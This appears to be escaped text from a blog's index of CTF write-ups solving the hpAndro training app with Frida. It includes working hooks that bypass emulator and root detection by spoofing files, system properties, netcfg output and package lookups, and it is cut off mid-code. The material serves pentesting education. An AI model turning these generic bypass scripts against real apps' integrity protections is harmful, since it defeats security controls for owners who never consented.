cellphone (to do this you could upload the file examples to /tmp).\nJava.perform( function () { var FileIS = Java.use(\u0026#34;java.io.FileInputStream\u0026#34;); FileIS.read.overload(\u0026#39;[B\u0026#39;).implementation = function(byteArray) { console.log(\u0026#34;entra\u0026#34;); var retByteArray = this.read(byteArray); var str = String.fromCharCode.apply(String, byteArray); if (str.indexOf(\u0026#34;goldfish\u0026#34;) \u0026gt;= 0) { var index = str.indexOf(\u0026#34;goldfish\u0026#34;); byteArray[index] = \u0026#34;a\u0026#34;.charCodeAt(0); byteArray[index+1] = \u0026#34;a\u0026#34;.charCodeAt(0); byteArray[index+2] = \u0026#34;a\u0026#34;.charCodeAt(0); byteArray[index+3] = \u0026#34;a\u0026#34;.charCodeAt(0); } return retByteArray; } }); To confirm the change you could intercept the following function:\nJava.perform( function () { var StringKt = Java.use(\u0026#34;kotlin.text.StringsKt__StringsKt\u0026#34;); StringKt.contains$default.overload(\u0026#39;java.lang.CharSequence\u0026#39;, \u0026#39;java.lang.CharSequence\u0026#39;, \u0026#39;boolean\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;java.lang.Object\u0026#39;).implementation = function (charSeq, charSeq2,boolZ, intI, objO) { console.log(\u0026#34;charSeq1: \u0026#34; + charSeq + \u0026#34; charSeq2: \u0026#34; + charSeq2); return this.contains$default(charSeq, charSeq2,boolZ, intI, objO); } }); b) checkQEmuProps\nIn this case the validation is the following one:\npublic final boolean checkQEmuProps() { Property[] propertyArr = PROPERTIES; int i = 0; for (Property property : propertyArr) { String prop = getProp(this.mContext, property.getName()); if (property.getSeek_value() == null \u0026amp;\u0026amp; prop != null) { i++; } if (property.getSeek_value() != null) { Intrinsics.checkNotNull(prop); String seek_value = property.getSeek_value(); Intrinsics.checkNotNull(seek_value); if (StringsKt.contains$default((CharSequence) prop, (CharSequence) seek_value, false, 2, (Object) null)) { i++; } } } if (i \u0026lt; 5) { return false; } log(\u0026#34;Check QEmuProps is detected\u0026#34;); return true; } which calls the following validation:\nprivate final String getProp(Context context, String str) { try { Class\u0026lt;?\u0026gt; loadClass = context.getClassLoader().loadClass(\u0026#34;android.os.SystemProperties\u0026#34;); Object invoke = loadClass.getMethod(\u0026#34;get\u0026#34;, String.class).invoke(loadClass, Arrays.copyOf(new Object[]{str}, 1)); if (invoke != null) { return (String) invoke; } throw new NullPointerException(\u0026#34;null cannot be cast to non-null type kotlin.String\u0026#34;); } catch (Exception unused) { return null; } In this case I reviewed the values retrieved by the SystemProperties in Genymotion and the only one I had to change was ro.hardware. Whenever you face this validation you might need to change another values as well:\nJava.perform ( function () { var SystemProperties = Java.use(\u0026#34;android.os.SystemProperties\u0026#34;); var String = Java.use(\u0026#34;java.lang.String\u0026#34;); SystemProperties.get.overload(\u0026#39;java.lang.String\u0026#39;).implementation = function (str) { console.log(str + \u0026#34;= \u0026#34; + this.get(str)); if (str == \u0026#34;ro.hardware\u0026#34;) { return String.$new(\u0026#34;vbox86\u0026#34;); } else { return this.get(str); } } }); c) checkFiles\nIn this validation, the application checks if some files exist on the cellphone which only exist on some emulators. This validation is done with two different list of files:\nboolean checkFiles = new EmulatorDetector(this.this$0).checkFiles(EmulatorDetector.Companion.getX86_FILES(), \u0026#34;X86\u0026#34;); boolean checkFiles2 = new EmulatorDetector(this.this$0).checkFiles(EmulatorDetector.Companion.getPIPES(), \u0026#34;Pipes\u0026#34;); The validation executed is the following one:\npublic final boolean checkFiles(String[] strArr, String str) { Intrinsics.checkNotNullParameter(strArr, \u0026#34;targets\u0026#34;); Intrinsics.checkNotNullParameter(str, \u0026#34;type\u0026#34;); for (String str2 : strArr) { if (new File(str2).exists()) { log(\u0026#34;Check \u0026#34; + str + \u0026#34; is detected\u0026#34;); return true; } } return false; } So the script generated modifies the behavior of the exists method on the class File:\nJava.perform ( function () { var File = Java.use(\u0026#34;java.io.File\u0026#34;); File.exists.implementation = function () { var path_file = this.path.value; if (path_file == \u0026#34;ueventd.android_x86.rc\u0026#34; || path_file == \u0026#34;x86.prop\u0026#34; || path_file == \u0026#34;ueventd.ttVM_x86.rc\u0026#34; || path_file == \u0026#34;init.ttVM_x86.rc\u0026#34; || path_file == \u0026#34;fstab.ttVM_x86\u0026#34; || path_file == \u0026#34;fstab.vbox86\u0026#34; || path_file == \u0026#34;init.vbox86.rc\u0026#34; || path_file == \u0026#34;ueventd.vbox86.rc\u0026#34; || path_file == \u0026#34;/dev/socket/qemud\u0026#34; || path_file == \u0026#34;/dev/goldfish_pipe\u0026#34; || path_file == \u0026#34;/dev/qemu_pipe\u0026#34;) { return false; } else { console.log(\u0026#34;DID NOT WORK: \u0026#34; + path_file); } return this.exists(); } }); Emulator Files Check Task This validation is the same as the one used in the previous validation, but the files to control are other ones. I updated the same script, but extended it for the new files:\nJava.perform ( function () { var File = Java.use(\u0026#34;java.io.File\u0026#34;); File.exists.implementation = function () { var path_file = this.path.value; if (path_file == \u0026#34;ueventd.android_x86.rc\u0026#34; || path_file == \u0026#34;x86.prop\u0026#34; || path_file == \u0026#34;ueventd.ttVM_x86.rc\u0026#34; || path_file == \u0026#34;init.ttVM_x86.rc\u0026#34; || path_file == \u0026#34;fstab.ttVM_x86\u0026#34; || path_file == \u0026#34;fstab.vbox86\u0026#34; || path_file == \u0026#34;init.vbox86.rc\u0026#34; || path_file == \u0026#34;ueventd.vbox86.rc\u0026#34; || path_file == \u0026#34;/dev/socket/qemud\u0026#34; || path_file == \u0026#34;/dev/goldfish_pipe\u0026#34; || path_file == \u0026#34;/dev/qemu_pipe\u0026#34; || path_file == \u0026#34;/dev/socket/genyd\u0026#34; || path_file == \u0026#34;/dev/socket/baseband_genyd\u0026#34; || path_file == \u0026#34;/system/genymotion/wallpapers/genymotion.png\u0026#34; || path_file == \u0026#34;/system/bin/genybaseband\u0026#34; || path_file == \u0026#34;/system/vendor/bin/hw/android.hardware.health@2.0-service.genymotion\u0026#34;) { return false; } return this.exists(); } }); Emulator Default Ip Check In this case the application works on the netcfg command and searches for the ip address assigned to the app. We\u0026rsquo;ll change the way the content is returned in order to avoid the detection of the validation. The code of the validation is the following one:\npublic final boolean checkIp() { if (ContextCompat.checkSelfPermission(this.mContext, \u0026#34;android.permission.INTERNET\u0026#34;) == 0) { String[] strArr = {\u0026#34;/system/bin/netcfg\u0026#34;}; StringBuilder sb = new StringBuilder(); try { ProcessBuilder processBuilder = new ProcessBuilder((String[]) Arrays.copyOf(strArr, 1)); processBuilder.directory(new File(\u0026#34;/system/bin/\u0026#34;)); processBuilder.redirectErrorStream(true); Process start = processBuilder.start(); Intrinsics.checkNotNullExpressionValue(start, \u0026#34;process\u0026#34;); InputStream inputStream = start.getInputStream(); byte[] bArr = new byte[1024]; while (inputStream.read(bArr) != -1) { sb.append(new String(bArr, Charsets.UTF_8)); } inputStream.close(); } catch (Exception unused) { } String sb2 = sb.toString(); Intrinsics.checkNotNullExpressionValue(sb2, \u0026#34;stringBuilder.toString()\u0026#34;); log(\u0026#34;netcfg data -\u0026gt; \u0026#34; + sb2); String str = sb2; if (!TextUtils.isEmpty(str)) { Object[] array = new Regex(\u0026#34;\\n\u0026#34;).split(str, 0).toArray(new String[0]); if (array != null) { String[] strArr2 = (String[]) array; for (String str2 : strArr2) { String str3 = str2; if ((StringsKt.contains$default((CharSequence) str3, (CharSequence) \u0026#34;wlan0\u0026#34;, false, 2, (Object) null) || StringsKt.contains$default((CharSequence) str3, (CharSequence) \u0026#34;tunl0\u0026#34;, false, 2, (Object) null) || StringsKt.contains$default((CharSequence) str3, (CharSequence) \u0026#34;eth0\u0026#34;, false, 2, (Object) null)) \u0026amp;\u0026amp; (StringsKt.contains$default((CharSequence) str3, (CharSequence) IP, false, 2, (Object) null) || StringsKt.contains$default((CharSequence) str3, (CharSequence) IP1, false, 2, (Object) null))) { log(\u0026#34;Check IP is detected \u0026#34; + str2); return true; } } } else { throw new NullPointerException(\u0026#34;null cannot be cast to non-null type kotlin.Array\u0026lt;T\u0026gt;\u0026#34;); } } } return false; } The script created to bypass it is the following. I took an example of netcfg output, and changed it in order to avoid the validation. Then I uploaded the file to /tmp/test.txt:\nJava.perform( function () { var ProcessBuilder = Java.use(\u0026#34;java.lang.ProcessBuilder\u0026#34;); ProcessBuilder.$init.overload(\u0026#39;[Ljava.lang.String;\u0026#39;).implementation = function (array) { if (array[0] == \u0026#34;/system/bin/netcfg\u0026#34;) { var params = new Array(); params[0] = \u0026#34;cat\u0026#34;; params[1] = \u0026#34;/tmp/test.txt\u0026#34;; return this.$init(params); } else { return this.$init(array); } } }); Check Package Name In this case the validation executed is the following one:\npublic final boolean checkPackageNameDetect(Context context, String[] strArr) { Intrinsics.checkNotNullParameter(context, \u0026#34;mContext\u0026#34;); Intrinsics.checkNotNullParameter(strArr, \u0026#34;additionalRootManagementApps\u0026#34;); boolean z = false; ArrayList arrayList = new ArrayList(CollectionsKt.listOf(new String[]{\u0026#34;com.google.android.launcher.layouts.genymotion\u0026#34;, \u0026#34;com.bluestacks\u0026#34;, \u0026#34;com.bignox.app\u0026#34;, \u0026#34;com.genymotion.genyd\u0026#34;, \u0026#34;com.genymotion.systempatcher\u0026#34;, \u0026#34;com.genymotion.tasklocker\u0026#34;}.toString())); if (strArr.length == 0) { z = true; } if (!z) { arrayList.addAll(Arrays.asList((String[]) Arrays.copyOf(strArr, strArr.length))); } return isAnyPackageFromListInstalled(context, arrayList); } which calls the following method:\nprivate final boolean isAnyPackageFromListInstalled(Context context, List\u0026lt;String\u0026gt; list) { Intrinsics.checkNotNull(context); PackageManager packageManager = context.getPackageManager(); Intrinsics.checkNotNullExpressionValue(packageManager, \u0026#34;mContext!!.packageManager\u0026#34;); boolean z = false; for (String str : list) { try { packageManager.getPackageInfo(str, 0); System.out.println((Object) (\u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; \u0026#34; + str + \u0026#34; ROOT management app detected!\u0026#34;)); z = true; } catch (PackageManager.NameNotFoundException unused) { } } return z; } If the application were not optimized the following script should work:\nJava.perform( function () { var PackageManagerNotFound = Java.use(\u0026#34;android.content.pm.PackageManager$NameNotFoundException\u0026#34;); console.log(PackageManagerNotFound); var PackageManager = Java.use(\u0026#34;android.content.pm.PackageManager\u0026#34;); PackageManager.getPackageInfo.overload(\u0026#39;java.lang.String\u0026#39;, \u0026#39;int\u0026#39;).implementation = function (str, valInt) { if (str == \u0026#34;com.google.android.launcher.layouts.genymotion\u0026#34; || str == \u0026#34;com.bluestacks\u0026#34; || str == \u0026#34;com.bignox.app\u0026#34; || str == \u0026#34;com.genymotion.genyd\u0026#34; || str == \u0026#34;com.genymotion.systempatcher\u0026#34; || str == \u0026#34;com.genymotion.tasklocker\u0026#34;) { throw PackageManagerNotFound.$new(); } else { return this.getPackageInfo(str, valInt); } } }); But as in my case the application was installed in an OS with optimizations, the resolution of the PackageManager isn\u0026rsquo;t in the Java layer. I still do not know how to intercept this, so I leave the standard resolution used in the root detection blogpost:\nJava.perform( function () { var EmulatorDetector = Java.use(\u0026#34;com.hpandro.androidsecurity.utils.emulatorDetection.EmulatorDetector\u0026#34;); EmulatorDetector.checkPackageNameDetect.implementation = function(context, strArr) { return false; } }); Debug Flag This is an atypical validation, because it checks a flag that is in the EmulatorDetector class, called isDebug. This value does not seem to be set anywhere in the application, so I just created an script like the one in the previous example:\nJava.perform( function () { var EmulatorDetector = Java.use(\u0026#34;com.hpandro.androidsecurity.utils.emulatorDetection.EmulatorDetector\u0026#34;); EmulatorDetector.isDebug.implementation = function() { return false; } }); Network Operator Name In this case the validation is the following one:\npublic final boolean checkOperatorNameAndroid() { Object systemService = this.mContext.getSystemService(\u0026#34;phone\u0026#34;); if (systemService == null) { throw new NullPointerException(\u0026#34;null cannot be cast to non-null type android.telephony.TelephonyManager\u0026#34;); } else if (!StringsKt.equals(((TelephonyManager) systemService).getNetworkOperatorName(), \u0026#34;android\u0026#34;, true)) { return false; } else { log(\u0026#34;Check operator name android is detected\u0026#34;); return true; } } This method uses the TelephonyManager as well, but it validates whether the NetworkOperatorName is android. As I already created scripts patching the TelephonyManager, I\u0026rsquo;ll not explain the solution:\nJava.perform( function () { var String = Java.use(\u0026#34;java.lang.String\u0026#34;); var TelephonyManager = Java.use(\u0026#34;android.telephony.TelephonyManager\u0026#34;); TelephonyManager.getNetworkOperatorName.overload().implementation = function () { //set a valid device id return String.$new(\u0026#34;android\u0026#34;); } }); Conclusion The controls shown in this application are commonly seen in production applications. As pentesters, it is important to understand them in order to find patterns in the applications we are analyzing to try to detect these controls and patch them in order to continue with the security analysis of the target. As a developer it is good to know how the controls work and how an attacker could try to bypass them.\nIn the blog I created several generic scripts that could work on any phone, so in case you find any validation related to emulation, you can use these in order to bypass them.\n","permalink":"https://cmrodriguez.me/blog/hpandro-6/","tags":["Frida","Android","CTF","Challenge","Emulation detection"],"title":"Solving CTF with Frida - Part 6"},{"categories":["Frida","Android"],"contents":"In this series of posts I\u0026rsquo;ll be solving the hpandro ctf challenges. hpAndro created an Android application with multiple vulnerabilities, following the MSTG.\nThis application has a lot of simple challenges, so it is good for beginners or to test some techniques. I\u0026rsquo;ll try to solve all the challenges using Frida. In each post I\u0026rsquo;ll explain the security concepts behind the challenge and when it is possible I\u0026rsquo;ll explain multiple ways to solve it. As a secondary objective I\u0026rsquo;ll try to use scripts that can work in multiple scenarios and not just to get the flag.\nThe content is divided in several pages, in order to make it easily searchable.\nIndex Intercepting Http traffic Intercepting Https, UDP and TCP traffic Intercepting Websocket traffic Root detection bypass Emulator detection bypass Exfiltrating SQlite content ","permalink":"https://cmrodriguez.me/blog/hpandro/","tags":["Android","Frida","hpAndro"],"title":"Solving hpAndro"},{"categories":["Frida","Android","CTF","Challenge","Root detection"],"contents":"In this series of posts I\u0026rsquo;ll be solving some persistence challenges from hpandro ctf challenges. hpAndro created an Android application with multiple vulnerabilities, following the MSTG.\nWe have eleven different challenges related to root detection mechanisms. Most of the root detection validations work in the same way, so I\u0026rsquo;ll do a generic analysis of how it works and then I\u0026rsquo;ll give details on how each validation works. List of validations:\nAvailability of BusyBox. Dangerous Properties. Potentially Dangerous applications. RootCloak available. RootManagement apps availables. RW System state. SafetyNet validation. StatSystemCall. Su Binaries available. Su exists. Test Keys availables. In order to execute a validation the application does the following:\na) Validate the state of the cellphone at start in order to check if the control have to be bypassed to get the flag. As an example in the RootManagement apps exercise the application validates if there is any RootManagement app in the cellphone. If there is none, the exercise would not have any sense because the flag would be retrieved without doing anything. So the application checks this, and if the control is not bypasseable, the application will launch an error whenever the user wants to execute the exercise (we\u0026rsquo;ll check this later on)\nb) Whenever the Task is executed, and a button of ROOT CHECK is pressed, the application execues the validation and if the service returns true, the flag is retrieved from the service.\nStep a Whenever the application starts up, the com.hpandro.androidsecurity.ui.activity.SplashActivity is called. The method onCreate has the following code:\n@Override public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_splash); rootDetection(); If we check what the rootDetection method does, we\u0026rsquo;ll see that it executes the same control that is then executed on each exercise and calls checkRootFlag:\npublic final void rootDetection() { BaseActivity baseActivity = this; checkRootFlag(SharedPrefsConst.PREF_RootManagementApps, RootDetectionUtils.Companion.checkFlagRootManagementApps(baseActivity)); checkRootFlag(SharedPrefsConst.PREF_PotentiallyDangerousApps, RootDetectionUtils.Companion.checkFlagPotentialDangerousApps(baseActivity)); checkRootFlag(SharedPrefsConst.PREF_TestKeys, RootDetectionUtils.Companion.checkFlagTestKeys()); checkRootFlag(SharedPrefsConst.PREF_DangerousProps, RootDetectionUtils.Companion.checkFlagDangerousProps()); checkRootFlag(SharedPrefsConst.PREF_BusyBoxBinary, RootDetectionUtils.Companion.checkFlagBusyBoxBinaries()); checkRootFlag(SharedPrefsConst.PREF_SuBinary, RootDetectionUtils.Companion.checkFlagSUBinaries()); checkRootFlag(SharedPrefsConst.PREF_SuExists, RootDetectionUtils.Companion.checkFlagSUExists()); checkRootFlag(SharedPrefsConst.PREF_RootCloakingApps, RootDetectionUtils.Companion.checkFlagRootClockingApps(baseActivity)); checkRootFlag(SharedPrefsConst.PREF_RWSystem, RootDetectionUtils.Companion.checkFlagRWSystems()); checkRootFlag(SharedPrefsConst.PREF_StatSystemcall, RootDetectionUtils.Companion.checkRunningProcesses(baseActivity)); SharedPreferences sharedPreferences2 = this.sharedPreferences; if (sharedPreferences2 == null) { Intrinsics.throwUninitializedPropertyAccessException(\u0026#34;sharedPreferences\u0026#34;); } } The checkRootFlag stores a value in a shared preference folder, which adds an F whether the validation returns \u0026ldquo;true\u0026rdquo; or 0 in the other case:\nprivate final void checkRootFlag(String str, boolean z) { String str2; SharedPreferences sharedPrefRootDetection = MainApp.Companion.getSharedPrefRootDetection(); String string = sharedPrefRootDetection.getString(str + AppConstant.pref, \u0026#34;00\u0026#34;); if (z) { str2 = Intrinsics.stringPlus(string, \u0026#34;F\u0026#34;); } else { str2 = Intrinsics.stringPlus(string, \u0026#34;0\u0026#34;); } MainApp.Companion.getSharedPrefRootDetection().edit().putBoolean(str, z).apply(); SharedPreferences.Editor edit = MainApp.Companion.getSharedPrefRootDetection().edit(); edit.putString(str + AppConstant.pref, str2).apply(); } If we check the shared preferences folder we see the following files:\nvbox86p:/data/data/com.hpandro.androidsecurity/shared_prefs # ls -al total 104 drwxrwx--x 2 u0_a101 u0_a101 4096 2021-07-25 12:30 . drwx------ 10 u0_a101 u0_a101 4096 2021-07-25 12:29 .. -rw-rw---- 1 u0_a101 u0_a101 277 2021-07-24 20:09 AndroidSecurity.xml -rw-rw---- 1 u0_a101 u0_a101 949 2021-07-24 20:09 EmulatorDetection.xml -rw-rw---- 1 u0_a101 u0_a101 188 2021-07-24 20:09 FirebaseAppHeartBeat.xml -rw-rw---- 1 u0_a101 u0_a101 65 2021-07-25 12:30 GTPlayerPurchases.xml -rw-rw---- 1 u0_a101 u0_a101 65 2021-07-25 12:30 OneSignal.xml -rw-rw---- 1 u0_a101 u0_a101 65 2021-07-25 12:30 OneSignalTriggers.xml -rw-rw---- 1 u0_a101 u0_a101 1066 2021-07-24 20:09 RootDetection.xml -rw-rw---- 1 u0_a101 u0_a101 127 2021-07-24 20:09 WebViewChromiumPrefs.xml -rw-rw---- 1 u0_a101 u0_a101 486 2021-07-24 20:09 admob.xml -rw-rw---- 1 u0_a101 u0_a101 270 2021-07-24 20:09 admob_user_agent.xml -rw-rw---- 1 u0_a101 u0_a101 1067 2021-07-25 12:29 com.google.android.gms.measurement.prefs.xml The file being updated is RootDetection.xml. The content has the following format:\n\u0026lt;?xml version=\u0026#39;1.0\u0026#39; encoding=\u0026#39;utf-8\u0026#39; standalone=\u0026#39;yes\u0026#39; ?\u0026gt; \u0026lt;map\u0026gt; \u0026lt;boolean name=\u0026#34;PotentiallyDangerousApps\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;boolean name=\u0026#34;StatSystemcall\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;string name=\u0026#34;RootManagementAppsStr\u0026#34;\u0026gt;00F\u0026lt;/string\u0026gt; \u0026lt;string name=\u0026#34;SuBinaryStr\u0026#34;\u0026gt;00F\u0026lt;/string\u0026gt; \u0026lt;string name=\u0026#34;StatSystemcallStr\u0026#34;\u0026gt;000\u0026lt;/string\u0026gt; \u0026lt;string name=\u0026#34;RWSystemStr\u0026#34;\u0026gt;000\u0026lt;/string\u0026gt; \u0026lt;boolean name=\u0026#34;RootManagementApps\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;string name=\u0026#34;SuExistsStr\u0026#34;\u0026gt;00F\u0026lt;/string\u0026gt; \u0026lt;boolean name=\u0026#34;BusyBoxBinary\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;boolean name=\u0026#34;RWSystem\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;string name=\u0026#34;PotentiallyDangerousAppsStr\u0026#34;\u0026gt;000\u0026lt;/string\u0026gt; \u0026lt;string name=\u0026#34;DangerousPropsStr\u0026#34;\u0026gt;00F\u0026lt;/string\u0026gt; \u0026lt;boolean name=\u0026#34;DangerousProps\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;boolean name=\u0026#34;SuBinary\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;boolean name=\u0026#34;RootCloakingApps\u0026#34; value=\u0026#34;false\u0026#34; /\u0026gt; \u0026lt;string name=\u0026#34;RootCloakingAppsStr\u0026#34;\u0026gt;000\u0026lt;/string\u0026gt; \u0026lt;string name=\u0026#34;BusyBoxBinaryStr\u0026#34;\u0026gt;00F\u0026lt;/string\u0026gt; \u0026lt;boolean name=\u0026#34;SuExists\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;boolean name=\u0026#34;TestKeys\u0026#34; value=\u0026#34;true\u0026#34; /\u0026gt; \u0026lt;string name=\u0026#34;TestKeysStr\u0026#34;\u0026gt;00F\u0026lt;/string\u0026gt; \u0026lt;/map\u0026gt; Step b Each control has an Activity that launches the validation which retrieves the flag in case the root detection returns false. The activity has button that generates the control:\nIf the control is passed, the flag is returned:\nand in case the control is not passed, nothing happens.\nThe activity calls an init method that sets the onCliCkListener of the button which will launch the validation.\n@Override public void onCreate(Bundle bundle) { super.onCreate(bundle); setContentView(R.layout.activity_X_task); init(); } public final void init() { Toolbar toolbar = (Toolbar) _$_findCachedViewById(R.id.toolbarTask); Intrinsics.checkNotNullExpressionValue(toolbar, \u0026#34;toolbarTask\u0026#34;); toolbar.setTitle(getString(R.string.X) + \u0026#34; Task\u0026#34;); ((Toolbar) _$_findCachedViewById(R.id.toolbarTask)).setNavigationOnClickListener(new BusyBoxBinaryTaskActivity$init$1(this)); ((Button) _$_findCachedViewById(R.id.btnCheRoot)).setOnClickListener(new XTaskActivity$init$2(this)); } The button creates an instance of a Listener called like the activity, but adding an $init$2 to the end. As an example the Listener that solves the control on BusyBoxBinaryTaskActivity is called BusyBoxBinaryTaskActivity$init$2. The validation is executed in the onClick method:\npublic final void onClick(View view) { String string = MainApp.Companion.getSharedPrefRootDetection().getString(\u0026#34;XStr\u0026#34;, \u0026#34;00\u0026#34;); //validatin of the root control boolean checkFlagBusyBoxBinaries = RootDetectionUtils.Companion.checkFlagBusyBoxBinaries(); Intrinsics.checkNotNull(string); if (!StringsKt.contains$default((CharSequence) string, (CharSequence) \u0026#34;F\u0026#34;, false, 2, (Object) null) || checkFlagBusyBoxBinaries) { //generate error textView2.setText(this.this$0.getString(R.string.busybox_binaries) + \u0026#34; detected on this location\\n\\n\u0026#34; + RootDetectionUtils.Companion.getX()); return; } XTaskActivity.access$getPresenter$p(this.this$0).getRootDetectFlag(\u0026#34;bbb\u0026#34;); } As it can be seen two different controls are validated. The first one is related to the value on the SharedPreference set on the step 1, and the second one is related to the specific control executed on the application. We have two different scenarios to face:\nThe Android OS has the condition of rooted analyzed in the Task, so the sharedPreference value will have an F, and then the RootDetectionUtils will return true in the evaluation. In this case the function to overwrite should be the one that returns the boolean checking the status. As an example the following script was created to solve the BusyBox challenge:\nJava.perform( function () { var RootDetectionUtils = Java.use(\u0026#34;com.hpandro.androidsecurity.utils.rootDetection.RootDetectionUtils$Companion\u0026#34;); RootDetectionUtils.checkFlagBusyBoxBinaries.implementation = function () { return false; } }); The Android OS does not have the condition of rooted analyzed, so the sharedPreference will not have an F and the RootDetectionUtils will return false. In the second case, the application shows an error message: In this case there are two basic alternatives. The first one is changing the environment, so the first validation sets the sharedPreference value with \u0026ldquo;F\u0026rdquo;, or changing the validation that checks if the condition is met to execute the root detection method.\nAs the first condition requires chaging and installing multiple applications, I decided to patch the app to bypass the validation:\nJava.perform( function () { var StringKt = Java.use(\u0026#34;kotlin.text.StringsKt__StringsKt\u0026#34;); StringKt.contains$default.overload(\u0026#39;java.lang.CharSequence\u0026#39;, \u0026#39;java.lang.CharSequence\u0026#39;, \u0026#39;boolean\u0026#39;, \u0026#39;int\u0026#39;, \u0026#39;java.lang.Object\u0026#39;).implementation = function (charSeq, charSeq2,boolZ, intI, objO) { if (charSeq2.toString().indexOf(\u0026#34;F\u0026#34;) \u0026gt;= 0) { console.log(\u0026#34;entra\u0026#34;); return true; } return this.contains$default(charSeq, charSeq2,boolZ, intI, objO); } }); In this script I patched the StringsKt.contains$default method found in the XTaskActivity$init$2:\nif (!StringsKt.contains$default((CharSequence) string, (CharSequence) \u0026#34;F\u0026#34;, false, 2, (Object) null) || detectPotentiallyDangerousApps) { The following validation was added:\nif (charSeq2.toString().indexOf(\u0026#34;F\u0026#34;) \u0026gt;= 0) { console.log(\u0026#34;entra\u0026#34;); return true; } because this method is used in multiple places in the application, so if it is changed to return always true, it will generate errors in the app. So in order to detect if the validation is the one used in the conditional for the rootCheck, I analyzed the second parameter from the function and if it has an \u0026ldquo;F\u0026rdquo;, I return always true. Let\u0026rsquo;s check now how the validations are done in order to understand what the applications do to detect Root mechanisms. All the controls can be found in the com.hpandro.androidsecurity.utils.rootDetection.RootDetectionUtils class:\nAvailability of BusyBox. BusyBox is a software suite that provides several Unix utilities in a single executable file. It runs in a variety of POSIX environments such as Linux, Android, and FreeBSD, although many of the tools it provides are designed to work with interfaces provided by the Linux kernel. It was specifically created for embedded operating systems with very limited resources. By default busybox is not installed in default Android firmwares. So it is a reasonable to assume that if busybox is in the system, it is because someone installed it (which would require root permissions). In this case a person could bypass this control by changing the binary name from busybox to another one. The method that validates it is checkFlagBusyBoxBinaries.\npublic final boolean checkFlagBusyBoxBinaries() { return checkForBinary(RootDetectionUtils.BINARY_BUSYBOX); //\u0026#34;busybox\u0026#34; } It calls the checkForBunary, which validates if the binary (busybox) can be found on some paths (getPath).\npublic boolean checkForBinary(String str) { Intrinsics.checkNotNullParameter(str, \u0026#34;filename\u0026#34;); String[] paths = getPaths(); boolean z = false; for (String str2 : paths) { String str3 = str2 + str; if (new File(str2, str).exists()) { System.out.println((Object) (\u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; \u0026#34; + str3 + \u0026#34; binary detected!\u0026#34;)); z = true; } } return z; } In this case getPath generates a String Array containing some hardcoded paths (RootDetectionUtils.suPaths) and the paths from the PATH environment variable:\npublic final String[] getPaths() { String[] strArr = RootDetectionUtils.suPaths; ArrayList arrayList = new ArrayList(CollectionsKt.listOf((Object[]) ((String[]) Arrays.copyOf(strArr, strArr.length)))); String str = System.getenv(\u0026#34;PATH\u0026#34;); ... Object[] array2 = new Regex(\u0026#34;:\u0026#34;).split(str, 0).toArray(new String[0]); if (array2 != null) { String[] strArr2 = (String[]) array2; for (String str2 : strArr2) { String str3 = !StringsKt.endsWith$default(str2, \u0026#34;/\u0026#34;, false, 2, (Object) null) ? str2 + \u0026#39;/\u0026#39; : \u0026#34;\u0026#34;; if (!arrayList.contains(str3)) { arrayList.add(str3); } } Object[] array3 = arrayList.toArray(new String[0]); if (array3 != null) { return (String[]) array3; } ... } Dangerous Properties. The application validates some properties set on /system/default.prop. This properties enable some features on the OS that could be dangerous. In this case the following two values are validated:\nro.debuggable = 1 (DiskLruCache.VERSION_1) makes any application debuggable despite the value it has on the AndroidManifest. ro.secure = 0, allows adb to be connected with a high privilege user (like root). These paremeters are considered dangerous, so the default Android firmwares do not set them on those values. In this case it is not easy to modify that file, because it is being recovered each time the Android firmware is restarted. Also it would disable some functionalities desired on rooted devices. The method that does this is the following one:\npublic final boolean checkFlagDangerousProps() { HashMap hashMap = new HashMap(); hashMap.put(\u0026#34;ro.debuggable\u0026#34;, DiskLruCache.VERSION_1); hashMap.put(\u0026#34;ro.secure\u0026#34;, \u0026#34;0\u0026#34;); String[] propsReader = propsReader(); if (propsReader == null) { return false; } boolean z = false; for (String str : propsReader) { for (String str2 : hashMap.keySet()) { String str3 = str; if (StringsKt.contains$default((CharSequence) str3, (CharSequence) str2, false, 2, (Object) null)) { String str4 = \u0026#39;[\u0026#39; + ((String) hashMap.get(str2)) + \u0026#39;]\u0026#39;; if (StringsKt.contains$default((CharSequence) str3, (CharSequence) str4, false, 2, (Object) null)) { System.out.println((Object) (\u0026#34;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt;\u0026gt; \u0026#34; + str2 + \u0026#34; = \u0026#34; + str4 + \u0026#34; detected!\u0026#34;)); z = true; } } } } return z; } Potentially Dangerous applications. In this case the application validates if some applications that are known to be malicious are installed in the phone. In this case the way to validate it is using the following method:\npublic final boolean detectPotentiallyDangerousApps(Context context, String[] strArr) { Intrinsics.checkNotNullParameter(context, \u0026#34;mContext\u0026#34;); Intrinsics.checkNotNullParameter(strArr, \u0026#34;additionalDangerousApps\u0026#34;); ArrayList arrayList = new ArrayList(); Companion companion = this; String[] knownDangerousAppsPackages = companion.getKnownDangerousAppsPackages(); arrayList.addAll(Arrays.asList((String[]) Arrays.copyOf(knownDangerousAppsPackages, knownDangerousAppsPackages.length))); if (!(strArr.length == 0)) { arrayList.addAll(Arrays.asList((String[]) Arrays.copyOf(strArr, strArr.length))); } return companion.isAnyPackageFromListInstalled(context, arrayList); } The application then calls the isAnyPackageFromListInstalled which checks if any package is in the cellphone by consuming the PackageManager:\nprivate final boolean isAnyPackageFromListInstalled(Context context, List\u0026lt;String\u0026gt; list) { Intrinsics.checkNotNull(context); PackageManager packageManager = context.getPackageManager(); Intrinsics.checkNotNullExpressionValue(packageManager, \u0026#34;mContext!!.packageManager\u0026#34;); boolean z = false; for (String str : list) { try { packageManager.getPackageInfo(str, 0); System.out.println((Object) 